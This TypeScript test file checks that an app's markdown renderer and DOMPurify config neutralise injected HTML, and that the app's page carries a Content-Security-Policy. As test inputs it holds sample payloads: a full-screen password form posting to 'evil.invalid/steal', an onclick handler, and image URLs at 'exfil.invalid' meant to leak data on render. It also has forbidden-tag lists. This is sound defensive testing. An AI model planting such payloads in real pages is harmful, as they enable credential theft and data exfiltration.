// Markdown rendering is a trust boundary: board posts, docs and AI answers (even while streaming) all go through
// lib/md-html.ts. Raw HTML must show as text, markdown images must become links (no fetch on render), and the
// DOMPurify config must drop anything that can draw over the app, post data or load remote media. Synthetic data.
import test from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { APP } from './helpers.ts'
import { mdToRawHtml, PURIFY } from '../src/lib/md-html.ts'

/** Real (unescaped) tags in an HTML string, lower-cased. */
const tags = (html: string) => [...html.matchAll(/<([a-z][a-z0-9-]*)\b([^>]*)>/gi)].map((m) => ({ name: m[1].toLowerCase(), attrs: m[2] }))

test('raw HTML in markdown renders as text: no form, input, button, style tag or style attribute', () => {
  const md = [
    'Hello',
    '',
    '<form action="https://evil.invalid/steal" style="position:fixed;inset:0;z-index:99999"><input type="password" name="t"><button>Save</button></form>',
    '',
    '<style>body{outline:solid}</style>',
    '',
    'Inline <span style="color:red">red</span> and <b onclick="x()">bold</b> text.',
    '',
    '<div style="position:fixed;inset:0">cover</div>',
  ].join('\n')
  const html = mdToRawHtml(md)
  const names = tags(html).map((t) => t.name)
  for (const bad of ['form', 'input', 'button', 'style', 'div', 'span', 'b']) assert.ok(!names.includes(bad), `no <${bad}> tag: ${html}`)
  assert.ok(!tags(html).some((t) => /\bstyle\s*=|\bon\w+\s*=|\baction\s*=/i.test(t.attrs)), 'no style/on*/action attributes on real tags')
  assert.ok(html.includes('&lt;form'), 'the raw HTML is still readable as text')
})

test('markdown images become plain links (no <img>, so nothing is fetched on render)', () => {
  const html = mdToRawHtml('Look ![p](https://exfil.invalid/a.png?d=notes) and ![](https://exfil.invalid/b.png)\n\n<img src="https://exfil.invalid/c.png">')
  assert.ok(!tags(html).some((t) => t.name === 'img'), html)
  assert.ok(html.includes('<a href="https://exfil.invalid/a.png?d=notes">p</a>'), 'the alt text links to the image')
  assert.ok(html.includes('<a href="https://exfil.invalid/b.png">https://exfil.invalid/b.png</a>'), 'no alt → the URL is the label')
})

test('ordinary markdown still renders; HTML comments stay hidden; code keeps its angle brackets', () => {
  const html = mdToRawHtml('# Title\n\nA [link](notes/a.md), **bold**, `people/<login>/ui.md`.\n\n<!-- removed: abc123 -->\n\n| a | b |\n|---|---|\n| 1 | 2 |\n')
  const names = tags(html).map((t) => t.name)
  for (const ok of ['h1', 'a', 'strong', 'code', 'table']) assert.ok(names.includes(ok), `<${ok}> renders`)
  assert.ok(!html.includes('removed: abc123'), 'comment hidden')
  assert.ok(html.includes('people/&lt;login&gt;/ui.md'), 'code text escaped, not dropped')
  assert.ok(mdToRawHtml('Use people/<login>/ui.md').includes('&lt;login&gt;'), 'bare <tag>-like text shows as text')
})

test('DOMPurify config forbids interactive, styling, embedding and media tags and their attributes', () => {
  for (const t of ['style', 'form', 'input', 'button', 'textarea', 'select', 'iframe', 'object', 'embed', 'img', 'picture', 'source', 'video', 'audio', 'svg', 'math'])
    assert.ok(PURIFY.FORBID_TAGS.includes(t), `FORBID_TAGS has ${t}`)
  for (const a of ['style', 'action', 'formaction', 'srcset', 'background', 'poster']) assert.ok(PURIFY.FORBID_ATTR.includes(a), `FORBID_ATTR has ${a}`)
})

test('index.html carries a CSP that blocks remote images, form posts, <base> and plugins', () => {
  const src = fs.readFileSync(path.join(APP, 'index.html'), 'utf8')
  const m = src.match(/<meta\s+http-equiv="Content-Security-Policy"\s+content="([^"]+)"/i)
  assert.ok(m, 'CSP meta present')
  const csp = m![1]
  assert.match(csp, /img-src 'self' data: https:\/\/avatars\.githubusercontent\.com(;|$)/)
  for (const d of ["form-action 'none'", "base-uri 'none'", "object-src 'none'"]) assert.ok(csp.includes(d), d)
  assert.ok(src.indexOf('Content-Security-Policy') < src.indexOf('<script'), 'CSP comes before the first script')
})
